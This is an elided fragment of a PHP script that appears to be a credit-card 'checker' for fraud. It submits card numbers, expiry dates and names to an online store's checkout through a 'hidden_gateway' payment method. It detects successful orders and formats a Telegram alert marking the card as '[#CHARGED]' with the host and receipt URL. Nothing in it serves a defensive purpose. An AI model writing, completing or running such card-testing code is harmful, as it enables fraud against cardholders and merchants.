...
$paymentMethods = [
    ...
    'hidden_gateway' => '/<input[^>]*name="payment_method"[^>]*value="hidden_gateway"/'
    ];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'name_on_card' => $fname,
    'card_number' => $cc,
    'card_expiry' => $mes_with_zero . ' / ' . $ano_no_20,
...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
 ...
 $telegramMessage = "[#CHARGED]-$lista [CVV CHARGED HIDDEN GATEWAY]
    \n[$hostname1]
    \n[$receiptUrl]\n";
